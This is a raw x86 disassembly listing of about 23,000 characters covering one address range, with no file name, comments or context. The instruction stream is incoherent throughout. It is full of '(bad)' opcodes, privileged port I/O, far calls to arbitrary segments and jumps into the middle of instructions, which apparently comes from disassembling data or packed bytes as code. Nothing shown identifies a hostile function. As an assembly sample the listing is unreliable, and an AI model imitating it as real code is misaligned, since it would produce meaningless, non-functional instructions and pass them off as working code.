  406f86:	add    dh,dh
  406f88:	xor    al,BYTE PTR [edi+0x7a]
  406f8b:	fcom   st(0)
  406f8d:	push   esi
  406f8e:	int3   
  406f8f:	cdq    
  406f90:	jnp    0x406f3a
  406f92:	adc    ebp,ecx
  406f94:	dec    esp
  406f95:	in     al,dx
  406f96:	sub    BYTE PTR [ecx],dh
  406f98:	push   ebx
  406f99:	popa   
  406f9a:	push   0x2598b363
  406f9f:	dec    esi
  406fa0:	mov    ebx,0xaa02a204
  406fa5:	popf   
  406fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa7:	xor    BYTE PTR [edi+0x57],dh
  406faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fab:	sub    edx,DWORD PTR [esi-0x49291461]
  406fb1:	adc    al,0xe6
  406fb3:	mov    eax,ds:0xb02a62b9
  406fb8:	pop    eax
  406fb9:	xchg   esp,eax
  406fba:	out    0x45,eax
  406fbc:	in     eax,0x24
  406fbe:	add    DWORD PTR [ecx-0x6bd93284],ebp
  406fc4:	jae    0x407030
  406fc6:	(bad)  
  406fc7:	jns    0x406fc9
  406fc9:	ret    
  406fca:	mov    edx,0x9b112d59
  406fcf:	mov    esp,0xdafda97c
  406fd4:	mov    cl,0x95
  406fd6:	fcmove st,st(4)
  406fd8:	ffreep st(6)
  406fda:	and    DWORD PTR [esp+eiz*8],eax
  406fdd:	stos   BYTE PTR es:[edi],al
  406fde:	adc    ebp,edi
  406fe0:	cdq    
  406fe1:	loop   0x406f9c
  406fe3:	pop    ebp
  406fe4:	mov    ebp,0x1bb9305
  406fe9:	inc    esp
  406fea:	shl    DWORD PTR [eax-0x7d9f4ed0],0x98
  406ff1:	sub    eax,0x71536fdc
  406ff6:	ror    bl,cl
  406ff8:	jle    0x406fbf
  406ffa:	mov    dl,0x56
  406ffc:	add    cl,ah
  406ffe:	xchg   esi,eax
  406fff:	(bad)  
  407000:	push   0x60
  407002:	xchg   esi,eax
  407003:	popf   
  407004:	and    bh,BYTE PTR [eax]
  407006:	inc    edx
  407007:	sbb    DWORD PTR ss:0xc2f42786,0xffffff9a
  40700f:	jae    0x407089
  407011:	cmp    eax,DWORD PTR [ecx+edi*1]
  407014:	mov    edi,0xa0c399db
  407019:	enter  0xc959,0xcd
  40701d:	daa    
  40701e:	daa    
  40701f:	xor    eax,0x9ebf221f
  407024:	mov    ebp,0x64c8c407
  407029:	and    ebx,0xc15ee614
  40702f:	outs   dx,BYTE PTR ds:[esi]
  407031:	and    eax,0x1feb2b6e
  407036:	mov    bl,0x69
  407038:	and    edx,DWORD PTR [edi]
  40703a:	add    ecx,DWORD PTR [ecx+0x51d3f7fc]
  407040:	xor    dh,cl
  407042:	fbld   TBYTE PTR [ecx]
  407044:	and    ebp,DWORD PTR [ebx+esi*2+0x5ee189df]
  40704b:	jge    0x4070a5
  40704d:	fistp  DWORD PTR [ebx+0xa128a9b]
  407053:	aam    0x19
  407055:	lds    esi,FWORD PTR [edx]
  407057:	pop    ebx
  407058:	jnp    0x4070cd
  40705a:	int    0xa
  40705c:	sub    ebx,DWORD PTR [eax+0x73]
  40705f:	mov    esp,0x64c7f93b
  407064:	and    al,0xb6
  407066:	or     DWORD PTR [edi+0x1f],edx
  407069:	in     al,0x21
  40706b:	jg     0x4070e1
  40706d:	xchg   ebx,eax
  40706e:	fistp  DWORD PTR [edi]
  407070:	jne    0x40700a
  407072:	xchg   BYTE PTR [ebx+0x4c],ch
  407075:	shr    WORD PTR [esi+0x8],cl
  407079:	cs inc esi
  40707b:	jmp    0xe1dcb23b
  407080:	popa   
  407081:	dec    edx
  407082:	inc    esp
  407083:	in     eax,0xb0
  407085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407086:	sub    BYTE PTR [edx-0x6a600470],bl
  40708c:	jmp    0x407088
  40708e:	dec    ecx
  40708f:	sub    edx,DWORD PTR [ebx+0x74]
  407092:	xchg   DWORD PTR [eax-0x5b],eax
  407095:	adc    ecx,DWORD PTR [ebp-0x4]
  407098:	je     0x4070ce
  40709a:	shl    BYTE PTR [edx+0x732cd0ec],1
  4070a0:	lds    esi,FWORD PTR [ecx]
  4070a2:	xor    ebx,DWORD PTR [edx+esi*8-0x59]
  4070a6:	dec    al
  4070a8:	adc    eax,0xf6c25b58
  4070ad:	xchg   esi,eax
  4070ae:	(bad)  [edi]
  4070b0:	jnp    0x407053
  4070b2:	mov    al,ds:0xa967f35c
  4070b7:	xlat   BYTE PTR ds:[ebx]
  4070b8:	push   0x16
  4070ba:	push   ecx
  4070bb:	sub    ebx,DWORD PTR [ebp+0x0]
  4070be:	cdq    
  4070bf:	rcr    bl,1
  4070c1:	rcl    DWORD PTR [edx-0x6f],0xcf
  4070c5:	push   ds
  4070c6:	xor    DWORD PTR [edx-0xcd0f05f],ecx
  4070cc:	call   FWORD PTR [ecx+0x2a6095c5]
  4070d2:	mov    dl,0xe4
  4070d4:	retf   0xf40e
  4070d7:	or     eax,0xd184e126
  4070dc:	arpl   WORD PTR [eax],bp
  4070de:	(bad)  
  4070df:	mov    bl,0x1a
  4070e1:	iret   
  4070e2:	mov    cl,0x7b
  4070e4:	or     eax,0xcefdc28f
  4070e9:	ins    BYTE PTR es:[edi],dx
  4070ea:	or     eax,0xbd5c38e0
  4070ef:	mov    bh,0xdb
  4070f1:	ja     0x4070ca
  4070f3:	xchg   edx,eax
  4070f4:	jb     0x4070ec
  4070f6:	fnstcw WORD PTR [esi-0x67]
  4070f9:	xchg   ebp,eax
  4070fa:	inc    edx
  4070fb:	mov    ebx,0x9d6e38ef
  407100:	sub    BYTE PTR [edx+ecx*2],al
  407103:	push   ss
  407104:	adc    al,0x51
  407106:	mov    bl,0xc2
  407108:	pusha  
  407109:	xor    eax,0x8d32d8a6
  40710e:	pop    ds
  40710f:	mov    ds:0x71af7e30,eax
  407114:	mov    edi,0xb3d80b70
  407119:	or     BYTE PTR [ecx+0x33],cl
  40711c:	cmp    BYTE PTR [edx+0x41],ch
  40711f:	out    dx,al
  407120:	or     BYTE PTR [ecx],dh
  407122:	hlt    
  407123:	fild   DWORD PTR [edi-0x18]
  407126:	cmp    eax,0x23151e41
  40712b:	jbe    0x407131
  40712d:	xor    edx,DWORD PTR ss:[esi+0x12abc2ea]
  407134:	inc    eax
  407135:	aam    0xd7
  407137:	inc    eax
  407138:	sbb    DWORD PTR [esi+0x7c],edi
  40713b:	mov    ebx,0x988909f6
  407140:	inc    BYTE PTR [esi+edx*8]
  407143:	or     eax,0xda821b1d
  407148:	imul   ebp,DWORD PTR [edi+eax*1-0x70b10a3b],0x6380630
  407153:	in     eax,dx
  407154:	in     eax,dx
  407155:	pop    edi
  407156:	cmp    al,0xb8
  407158:	jae    0x4070e1
  40715a:	(bad)  
  40715b:	xchg   edi,eax
  40715c:	dec    esp
  40715d:	in     al,0x34
  40715f:	mov    edi,0x9a17d07
  407164:	clc    
  407165:	(bad)  
  407166:	jmp    0x407112
  407168:	pop    edi
  40716a:	adc    dh,BYTE PTR [ecx-0x35]
  40716d:	cld    
  40716e:	and    BYTE PTR [ebx],dl
  407170:	mov    ah,0xfd
  407172:	mov    ?,WORD PTR ds:0x9f258a15
  407178:	inc    edi
  407179:	daa    
  40717a:	(bad)  
  40717b:	dec    eax
  40717c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40717d:	mov    edi,0x3fa0dda3
  407182:	lds    ebx,FWORD PTR [esp+ecx*2]
  407185:	mov    ss,WORD PTR [ebx]
  407187:	dec    ebp
  407188:	sub    DWORD PTR [edi+eiz*8],edi
  40718b:	enter  0x72b,0xb0
  40718f:	and    DWORD PTR [edx-0x6eac9e23],esp
  407195:	sbb    eax,0xef350f44
  40719a:	sub    dh,0xa2
  40719d:	jo     0x4071f1
  40719f:	aam    0x57
  4071a1:	push   ds
  4071a2:	je     0x40715d
  4071a4:	shl    BYTE PTR [ebx],0xbc
  4071a7:	push   es
  4071a8:	xchg   edx,eax
  4071a9:	or     BYTE PTR [esi+ebp*8+0x3c],dl
  4071ad:	cmp    BYTE PTR [ebx],bh
  4071af:	dec    edx
  4071b0:	jae    0x40719e
  4071b2:	jbe    0x4071cb
  4071b4:	pushf  
  4071b5:	aam    0x55
  4071b7:	sti    
  4071b8:	repz add DWORD PTR [ebx],ebp
  4071bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071bc:	jg     0x407147
  4071be:	cmp    BYTE PTR [ebx+ecx*4-0x4bf9d589],ch
  4071c5:	rol    bl,1
  4071c7:	in     al,0x72
  4071c9:	shl    ch,1
  4071cb:	mov    ds:0xe306fd8b,al
  4071d0:	jne    0x40720a
  4071d2:	sub    DWORD PTR [ecx+0x17],ebx
  4071d5:	into   
  4071d6:	rcr    dh,cl
  4071d8:	xchg   edx,eax
  4071d9:	ret    0xc88d
  4071dc:	mov    cl,0x39
  4071de:	jecxz  0x407218
  4071e0:	and    al,0x83
  4071e2:	dec    esi
  4071e3:	dec    ebx
  4071e4:	mov    esi,0x97dc3aa2
  4071e9:	outs   dx,BYTE PTR ds:[esi]
  4071ea:	adc    BYTE PTR [ebp+ebx*1-0x6700e3b7],ah
  4071f1:	clc    
  4071f2:	ins    DWORD PTR es:[edi],dx
  4071f3:	cmp    esp,ebp
  4071f5:	hlt    
  4071f6:	les    edi,FWORD PTR [ebp-0x7c]
  4071f9:	dec    ecx
  4071fa:	xor    al,0x7b
  4071fc:	pop    esp
  4071fd:	pusha  
  4071fe:	adc    DWORD PTR [eax],ecx
  407200:	mov    edx,0x5834e36c
  407205:	scas   eax,DWORD PTR es:[edi]
  407206:	out    dx,al
  407207:	mov    esp,0xc2d44e12
  40720c:	dec    ebx
  40720d:	sub    eax,0xcfea7fa
  407212:	mov    dh,BYTE PTR [edi+0x7ce8c0a7]
  407218:	fs das 
  40721a:	mov    eax,0xd4e31b49
  40721f:	in     al,0x6d
  407221:	stos   BYTE PTR es:[edi],al
  407222:	push   ds
  407223:	cmc    
  407224:	cmp    al,0x47
  407226:	or     dh,bh
  407228:	push   ecx
  407229:	lahf   
  40722a:	fsub   DWORD PTR [ecx+0x7d]
  40722d:	in     eax,0x65
  40722f:	lods   al,BYTE PTR ds:[esi]
  407230:	sahf   
  407231:	data16 das 
  407233:	jmp    0x4071df
  407235:	xchg   esp,eax
  407236:	scas   al,BYTE PTR es:[edi]
  407237:	push   ebx
  407238:	xlat   BYTE PTR ds:[ebx]
  407239:	dec    esp
  40723a:	inc    ebx
  40723b:	jno    0x4072b2
  40723d:	leave  
  40723e:	test   esp,0xc4247171
  407244:	sub    eax,0x39d187a6
  407249:	fstp   TBYTE PTR cs:[eax+0x3a]
  40724d:	sar    DWORD PTR [ebp-0x39],0xdb
  407251:	repnz sbb eax,0xadfffffb
  407257:	jo     0x407214
  407259:	inc    ebx
  40725b:	je     0x4072a8
  40725d:	push   esp
  40725e:	add    eax,0xe84fc611
  407263:	ins    BYTE PTR es:[edi],dx
  407264:	push   esi
  407265:	add    DWORD PTR [eax+0x77],ecx
  407268:	mov    ah,0x7b
  40726a:	sub    bl,BYTE PTR [ebx+0x14116be8]
  407270:	or     al,0x35
  407272:	je     0x40725c
  407274:	cld    
  407275:	hlt    
  407276:	mov    cs,eax
  407278:	dec    esi
  407279:	dec    edi
  40727a:	rcl    DWORD PTR [ecx-0x57cc7254],0x49
  407281:	mov    esp,0x8df6ec34
  407286:	sbb    eax,0xa3572bfc
  40728b:	and    ecx,DWORD PTR [ecx-0x7b]
  40728e:	jae    0x4072a3
  407290:	xlat   BYTE PTR ds:[ebx]
  407291:	push   ebp
  407292:	je     0x40728e
  407294:	push   0x38c9c0d4
  407299:	int3   
  40729a:	rcr    BYTE PTR ds:0xea541791,cl
  4072a0:	hlt    
  4072a1:	pop    esi
  4072a2:	push   0x8f4d2de0
  4072a7:	mov    ecx,0x889796ff
  4072ac:	sub    ch,BYTE PTR [ecx+0x8]
  4072af:	mov    esi,0xb86649fc
  4072b4:	mov    al,ds:0xbaa82e8e
  4072b9:	test   edi,ecx
  4072bb:	sub    al,0xcc
  4072bd:	out    0x52,al
  4072bf:	xor    ecx,esp
  4072c1:	xchg   ebx,eax
  4072c2:	in     eax,dx
  4072c3:	dec    eax
  4072c4:	idiv   edx
  4072c6:	int    0xe6
  4072c8:	(bad)  
  4072c9:	not    DWORD PTR [eax-0x3b4f2601]
  4072cf:	push   cs
  4072d0:	jae    0x407296
  4072d2:	inc    ecx
  4072d3:	sub    ecx,esp
  4072d5:	sbb    BYTE PTR [edi+0x29927b77],dh
  4072db:	out    0xe8,eax
  4072dd:	sub    DWORD PTR [ebx+0x7d],0xe988844b
  4072e4:	call   0xc1409730
  4072e9:	mov    DWORD PTR [edx+0x76],0x74256a36
  4072f0:	or     eax,0x81d1b704
  4072f5:	mov    cl,0xc6
  4072f7:	(bad)  
  4072f8:	stc    
  4072f9:	ja     0x407298
  4072fb:	xor    ebx,DWORD PTR [edx-0x327f86d1]
  407301:	lea    ebp,[esi+0xd48377a]
  407307:	int3   
  407308:	or     al,0x1a
  40730a:	dec    ecx
  40730b:	mov    edx,0x13644878
  407310:	mov    ah,0x5b
  407312:	ins    DWORD PTR es:[edi],dx
  407313:	jmp    DWORD PTR [ecx-0x4614db52]
  407319:	dec    esp
  40731a:	test   BYTE PTR [ebp-0x183a3127],ch
  407320:	(bad)  
  407321:	jb     0x4072b9
  407323:	add    eax,0x74c0c577
  407328:	sub    cl,BYTE PTR [edi+0x74]
  40732b:	jmp    FWORD PTR [ecx+0x5ab83519]
  407331:	dec    eax
  407332:	cmp    BYTE PTR [edx+0x1d9b5457],ah
  407338:	mov    esp,0x51434c0a
  40733d:	xchg   edx,eax
  40733e:	out    0xaf,al
  407340:	mov    ah,0xb1
  407342:	je     0x40731d
  407344:	stc    
  407345:	sub    ebx,DWORD PTR [ecx]
  407347:	fadd   QWORD PTR [ebp+eiz*4+0x25]
  40734b:	push   0xc
  40734d:	gs adc ch,ah
  407350:	cmp    BYTE PTR es:[eax],bh
  407353:	popa   
  407354:	mov    ecx,0x2be01858
  407359:	xlat   BYTE PTR ds:[ebx]
  40735a:	(bad)  
  40735b:	fisttp QWORD PTR [eax+0x34]
  40735e:	lahf   
  40735f:	pushf  
  407360:	call   0xeb88:0x990a6b51
  407367:	cmp    bl,BYTE PTR [ebp+eiz*2+0x3fca1998]
  40736e:	mov    bh,0x89
  407370:	lods   eax,DWORD PTR ds:[esi]
  407371:	test   BYTE PTR [ebp+0x48],ah
  407374:	pop    ebp
  407375:	push   eax
  407376:	adc    BYTE PTR [edi-0x525f326c],bl
  40737c:	and    al,BYTE PTR [ebx+0x3fa692e9]
  407382:	enter  0x9501,0x87
  407386:	rsqrtps xmm5,xmm1
  407389:	push   0xf
  40738b:	lds    edi,FWORD PTR [ebx-0x6cbd5f24]
  407391:	retf   
  407392:	push   esp
  407393:	les    esp,FWORD PTR [ebp-0xb]
  407396:	xchg   esp,eax
  407397:	cmp    al,0xb7
  407399:	jmp    0x36a0d556
  40739e:	mov    edx,0xa52387bf
  4073a3:	jmp    0x155abdfa
  4073a8:	js     0x407331
  4073aa:	mov    al,0xe2
  4073ac:	push   ds
  4073ad:	gs mov bh,0x63
  4073b0:	mov    ebp,edi
  4073b2:	adc    esi,edx
  4073b4:	inc    eax
  4073b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073b6:	jnp    0x407376
  4073b8:	jecxz  0x407356
  4073ba:	push   0xffffffc1
  4073bc:	pop    esp
  4073bd:	cmp    dh,bh
  4073bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073c0:	dec    ecx
  4073c1:	ror    DWORD PTR [ecx+eiz*4-0x4e],1
  4073c5:	inc    edi
  4073c6:	pop    es
  4073c7:	scas   al,BYTE PTR es:[edi]
  4073c8:	adc    ah,cl
  4073ca:	(bad)  
  4073cb:	jne    0x40735e
  4073cd:	aaa    
  4073ce:	jo     0x8af6505b
  4073d4:	ds (bad) 
  4073d6:	dec    ecx
  4073d7:	mov    ebp,0xc21e18bd
  4073dc:	mov    ecx,ecx
  4073de:	mov    ch,0xbf
  4073e0:	out    0xd3,eax
  4073e2:	mov    esp,0x9a38c271
  4073e7:	test   BYTE PTR [edi],dl
  4073e9:	sbb    DWORD PTR [ebp+0x4fb5cd26],0x4
  4073f0:	push   ecx
  4073f1:	shr    ecx,0x65
  4073f4:	inc    esp
  4073f5:	xchg   edi,eax
  4073f6:	push   ss
  4073f7:	add    BYTE PTR [bx],0x8b
  4073fb:	ss popf 
  4073fd:	call   0xd8b3:0xa7216b84
  407404:	fist   DWORD PTR [edx]
  407406:	stos   BYTE PTR es:[edi],al
  407407:	xchg   DWORD PTR [edx+esi*1],esi
  40740a:	or     eax,0x9f48cd86
  40740f:	pop    ds
  407410:	loope  0x4073ba
  407412:	je     0x407485
  407414:	xchg   DWORD PTR [ebp+0x63363f54],esp
  40741a:	push   edi
  40741b:	pop    ecx
  40741c:	jne    0x4073aa
  40741e:	adc    dl,ah
  407420:	cmp    dl,0xd
  407423:	dec    esp
  407424:	inc    DWORD PTR [edx]
  407426:	lock cmp eax,0x8813b1fa
  40742c:	xchg   BYTE PTR [eax],ch
  40742e:	bound  ebx,QWORD PTR [edi]
  407430:	daa    
  407431:	jmp    0x6adce4b6
  407436:	or     ebp,DWORD PTR [eax-0x25db29a1]
  40743c:	add    dh,BYTE PTR [eax+0x64]
  40743f:	sub    BYTE PTR [esi+ebp*8],0xa2
  407443:	mov    ds:0x3a7c39f7,eax
  407448:	inc    ecx
  407449:	inc    edx
  40744a:	popa   
  40744b:	pop    esi
  40744c:	or     BYTE PTR [edi+0x2c94e6a8],0x15
  407453:	(bad)  
  407454:	std    
  407455:	pop    ebx
  407456:	push   ebx
  407457:	(bad)  
  407458:	cmp    eax,0x5f6d6c1f
  40745d:	out    dx,al
  40745e:	mov    eax,DWORD PTR [eax]
  407460:	pop    ebx
  407461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407462:	imul   esp,edx,0x51
  407465:	sbb    ecx,ebx
  407467:	in     eax,dx
  407468:	clc    
  407469:	cmp    al,0x83
  40746b:	rcl    BYTE PTR [ecx],0xaa
  40746e:	push   esp
  40746f:	lahf   
  407470:	jmp    0x8d32:0xe65a1fe0
  407477:	cmp    ah,al
  407479:	dec    esi
  40747a:	int3   
  40747b:	shl    BYTE PTR [esi],cl
  40747d:	sbb    BYTE PTR [eax],bl
  40747f:	and    edx,DWORD PTR [esi]
  407481:	sar    BYTE PTR [esi+0x219c1953],cl
  407487:	add    dl,bl
  407489:	push   edi
  40748a:	xor    DWORD PTR [edx],ebx
  40748c:	pop    esi
  40748d:	or     bh,BYTE PTR [ecx+edi*4]
  407490:	dec    esi
  407491:	in     eax,0xb1
  407493:	hlt    
  407494:	jne    0x4074dd
  407496:	lods   al,BYTE PTR ds:[esi]
  407497:	dec    edi
  407498:	mov    ds:0x34bb5781,al
  40749d:	mov    ss:0x23c7d24f,eax
  4074a3:	add    ah,ah
  4074a5:	test   eax,0x7c6a065
  4074aa:	xchg   esi,eax
  4074ab:	frstor [esi]
  4074ad:	mov    esi,0xb59808a5
  4074b2:	mov    DWORD PTR [esi+0x3f768d5],esi
  4074b8:	adc    al,0xe5
  4074ba:	call   0xfbb7:0x83c836b
  4074c1:	mov    ds:0x7ab16cab,eax
  4074c6:	and    eax,0xead8d58
  4074cb:	and    BYTE PTR [edx],0x48
  4074ce:	push   ebp
  4074cf:	pop    ebx
  4074d0:	(bad)
  4074d4:	repnz adc DWORD PTR [edx+0x3b],edi
  4074d8:	push   ds
  4074d9:	push   esi
  4074da:	dec    ecx
  4074db:	addr16 jnp 0x407508
  4074de:	mov    edi,DWORD PTR [ebx-0x66]
  4074e1:	push   0xd3059232
  4074e6:	cmc    
  4074e7:	sub    esp,edx
  4074e9:	jmp    0x6d77:0xb1a7ad51
  4074f0:	jle    0x407507
  4074f2:	and    bl,cl
  4074f4:	(bad)  
  4074f5:	std    
  4074f6:	lods   al,BYTE PTR ds:[esi]
  4074f7:	sub    DWORD PTR [edx+0x54],edx
  4074fa:	push   esi
  4074fb:	dec    ebp
  4074fc:	sahf   
  4074fd:	dec    ebx
  4074fe:	lds    esp,FWORD PTR [ecx-0x7e]
  407501:	rcr    DWORD PTR [ebx+0x5b],0xb
  407505:	iret   
  407506:	clc    
  407507:	adc    edi,DWORD PTR [esi-0x769a4df8]
  40750d:	mov    ebp,0xe5aca636
  407512:	lea    edi,ss:[edx+0x7ce15105]
  407519:	mov    esi,0xf99caa9b
  40751e:	sub    BYTE PTR ds:0x1fd6d616,ah
  407524:	mov    bh,0xd4
  407526:	cmp    edi,edx
  407528:	(bad)  [ebx-0x31804cca]
  40752e:	sub    DWORD PTR [ecx-0x36e655b],eax
  407534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407535:	mov    ecx,0x4f2a73f9
  40753a:	cldemote BYTE PTR [ecx]
  40753d:	stos   BYTE PTR es:[edi],al
  40753e:	stos   BYTE PTR es:[edi],al
  40753f:	push   cs
  407540:	pop    ss
  407541:	sub    esi,esi
  407543:	push   esp
  407544:	rol    edx,1
  407546:	inc    eax
  407547:	test   eax,0x1e30f6e2
  40754c:	add    ebp,esp
  40754e:	mov    cl,0x61
  407550:	loopne 0x4074ea
  407552:	and    bh,BYTE PTR [ebp-0x18]
  407555:	sti    
  407556:	dec    esi
  407557:	sbb    ah,BYTE PTR [eax]
  407559:	scas   eax,DWORD PTR es:[edi]
  40755a:	add    BYTE PTR [eax+edi*2-0x6d203416],bl
  407561:	ret    0x8a69
  407564:	mov    esp,0xae9f89bb
  407569:	sti    
  40756a:	sub    dh,ah
  40756c:	sbb    eax,DWORD PTR [edi-0xe]
  40756f:	and    al,0x16
  407571:	sub    ecx,DWORD PTR [eax]
  407573:	idiv   BYTE PTR [ebp+0x5607b0f8]
  407579:	dec    edx
  40757a:	ja     0x4075cf
  40757c:	add    bh,BYTE PTR [ebx+ecx*2]
  40757f:	stc    
  407580:	lds    ebp,FWORD PTR [ebp+0x36]
  407583:	pop    edi
  407584:	pop    ecx
  407585:	shl    BYTE PTR [esi-0x4c],cl
  407588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407589:	test   BYTE PTR [edx+eax*4],bl
  40758c:	je     0x407538
  40758e:	and    ch,ah
  407590:	inc    esi
  407591:	xchg   edi,eax
  407592:	loopne 0x407611
  407594:	cdq    
  407595:	mov    edi,0xf00cda9b
  40759a:	pop    ds
  40759b:	and    DWORD PTR [esp-0xff278f],edx
  4075a2:	retf   
  4075a3:	mov    ?,WORD PTR [edi-0x14]
  4075a6:	scas   eax,DWORD PTR es:[edi]
  4075a7:	mov    al,0x32
  4075a9:	sub    edi,0x6b621af1
  4075af:	and    dx,cx
  4075b2:	lods   eax,DWORD PTR ds:[si]
  4075b4:	(bad)  [eax*8-0x4d3a3fd6]
  4075bb:	cmp    eax,0xe04ab780
  4075c0:	call   0x1a5:0x7b3a209c
  4075c7:	cmp    al,BYTE PTR gs:[ebp-0x7f]
  4075cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075cc:	mov    bl,0xb3
  4075ce:	stos   BYTE PTR es:[edi],al
  4075cf:	and    ecx,esp
  4075d1:	xchg   ecx,eax
  4075d2:	sbb    DWORD PTR [edx+0x717eb29a],eax
  4075d8:	xchg   BYTE PTR [ecx+edi*2],bl
  4075db:	lea    ebp,[eax+0x3a]
  4075de:	inc    ebp
  4075df:	call   0x241c:0x45dee9d
  4075e6:	cmp    edi,DWORD PTR [ecx]
  4075e8:	icebp  
  4075e9:	neg    BYTE PTR [edx]
  4075eb:	pop    es
  4075ec:	jp     0x40762e
  4075ee:	fwait
  4075ef:	cmp    ch,BYTE PTR [ecx]
  4075f1:	push   es
  4075f2:	and    eax,0x18239448
  4075f7:	fdivr  DWORD PTR [ebx]
  4075f9:	add    BYTE PTR [edx+0xf],al
  4075fc:	adc    eax,0xc2d606f7
  407601:	or     ch,BYTE PTR [eax+0x5bf73cc8]
  407607:	mov    ?,WORD PTR [ebx+0x78428551]
  40760d:	adc    DWORD PTR [eax-0x2d],edx
  407610:	aaa    
  407611:	in     al,dx
  407612:	cmc    
  407613:	mov    esi,0x7525badd
  407618:	lock xchg esi,eax
  40761a:	bound  ecx,QWORD PTR [eax-0x15e5e362]
  407620:	inc    eax
  407621:	jp     0x40768e
  407623:	jns    0x407641
  407625:	and    eax,DWORD PTR [ecx]
  407627:	aas    
  407628:	in     al,dx
  407629:	and    BYTE PTR [esi-0x12025fdf],cl
  40762f:	dec    edx
  407630:	out    dx,al
  407631:	aad    0x78
  407633:	test   al,0x9a
  407635:	xor    al,0x8
  407637:	jmp    0x40767a
  407639:	shr    DWORD PTR [esi],0x2f
  40763c:	out    dx,al
  40763d:	pop    edi
  40763e:	mov    dh,0x8f
  407640:	pop    edx
  407641:	fsubr  st(0),st
  407643:	repz stc 
  407645:	push   0xeddb1b8d
  40764a:	sbb    DWORD PTR [ebp+0x7c0b78ad],eax
  407650:	adc    BYTE PTR [ebp-0x1],bh
  407653:	pop    es
  407654:	mov    edx,0x502b8d44
  407659:	scas   al,BYTE PTR es:[edi]
  40765a:	mov    bx,WORD PTR [ecx+ecx*1-0x465284d8]
  407662:	icebp  
  407663:	pusha  
  407664:	jnp    0x40763a
  407666:	shl    ah,1
  407668:	mov    edi,DWORD PTR [ebp-0x519990fe]
  40766e:	sub    dl,ch
  407670:	push   ecx
  407671:	xchg   ecx,eax
  407672:	loope  0x4076da
  407674:	adc    DWORD PTR [esi-0x75],edx
  407677:	and    DWORD PTR [ebp+0x53da1e9],0xffffffd9
  40767e:	push   edi
  40767f:	loope  0x4076d8
  407681:	jno    0x407629
  407683:	jo     0x407641
  407685:	xor    DWORD PTR [eax],esi
  407687:	or     bh,dl
  407689:	(bad)  
  40768a:	fisub  WORD PTR ds:[ebx-0x19b7ad6e]
  407691:	in     al,0xd3
  407693:	jl     0x4076d1
  407695:	pop    eax
  407696:	dec    esi
  407697:	push   edx
  407698:	add    edi,edx
  40769a:	xor    ebx,esp
  40769c:	stc    
  40769d:	mov    esi,0xd7f6b6fe
  4076a2:	xchg   ebp,eax
  4076a3:	loop   0x4076f9
  4076a5:	mov    eax,ds:0xb59fe649
  4076aa:	jnp    0x40764d
  4076ac:	les    ebx,FWORD PTR [esi-0x3b]
  4076af:	ds mov ah,0xa5
  4076b2:	xor    DWORD PTR ds:0x6f3dad77,ebx
  4076b8:	stc    
  4076b9:	stc    
  4076ba:	sub    al,BYTE PTR [edi+0x21]
  4076bd:	xchg   edi,eax
  4076be:	scas   al,BYTE PTR es:[edi]
  4076bf:	cvtps2pd xmm7,QWORD PTR [ebx]
  4076c2:	jnp    0x40772c
  4076c4:	fnsave [ecx-0x5d2a6b5d]
  4076ca:	pushf  
  4076cb:	sbb    edi,edi
  4076cd:	inc    esp
  4076ce:	push   esi
  4076cf:	or     eax,0x13b9248b
  4076d4:	sbb    ecx,edx
  4076d6:	mov    cl,0xc9
  4076d8:	fldenv [esi*8-0x336be0e4]
  4076df:	dec    esp
  4076e0:	push   0xffffffa3
  4076e2:	push   ebx
  4076e3:	pushf  
  4076e4:	stos   BYTE PTR es:[edi],al
  4076e5:	jbe    0x407751
  4076e7:	ret    
  4076e8:	dec    ebx
  4076e9:	xchg   esi,eax
  4076ea:	push   0xb65ced80
  4076ef:	outs   dx,DWORD PTR ds:[esi]
  4076f0:	jmp    0xa4f03346
  4076f5:	pop    edx
  4076f6:	inc    eax
  4076f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076f8:	mov    edx,0xf7a6e656
  4076fd:	popf   
  4076fe:	rol    DWORD PTR [ebx],1
  407700:	push   eax
  407701:	test   esp,0xac32d2ce
  407707:	mov    esp,0x9b1cd652
  40770c:	jb     0x407778
  40770e:	enter  0xa7fe,0x95
  407712:	adc    edi,esp
  407714:	mov    bh,0xdb
  407716:	ss pop edi
  407718:	pop    ds
  407719:	adc    esp,DWORD PTR [esi-0x69]
  40771c:	xor    BYTE PTR [edi],0xbb
  40771f:	xchg   ecx,eax
  407720:	add    DWORD PTR [edx+0x62],edx
  407723:	std    
  407724:	jbe    0x4076fc
  407726:	dec    ebp
  407727:	ja     0x40777a
  407729:	test   edi,edx
  40772b:	cmp    BYTE PTR [edi],ah
  40772d:	(bad)  
  40772e:	out    dx,al
  40772f:	xor    DWORD PTR [esi+0x19fe9d98],esp
  407735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407736:	test   eax,0xcddfea86
  40773b:	iret   
  40773c:	mov    ds:0xb6ae4a40,al
  407741:	clc    
  407742:	aas    
  407743:	lods   eax,DWORD PTR ds:[esi]
  407744:	push   edi
  407745:	cld    
  407746:	fcomp  DWORD PTR [edi-0x46f53d2f]
  40774c:	loop   0x40773a
  40774e:	not    esi
  407750:	xor    eax,0x34f5c1e0
  407755:	inc    edi
  407756:	inc    eax
  407757:	(bad)
  40775a:	jmp    0x8b49fb7d
  40775f:	mov    esp,DWORD PTR [eax-0x35]
  407762:	push   esi
  407763:	js     0x4077b2
  407765:	xchg   esi,eax
  407766:	std    
  407767:	into   
  407768:	dec    edx
  407769:	cdq    
  40776a:	push   edi
  40776b:	and    ebx,DWORD PTR [edx+eax*1]
  40776e:	push   edi
  40776f:	mov    ebx,0xe6a267f6
  407774:	sbb    ah,cl
  407776:	xor    eax,0xd9c6d807
  40777b:	cli    
  40777c:	ror    BYTE PTR [ebp+0x24ec438a],1
  407782:	stc    
  407783:	aam    0x8c
  407785:	hlt    
  407786:	push   es
  407787:	sahf   
  407788:	jo     0x407788
  40778a:	push   ss
  40778b:	stc    
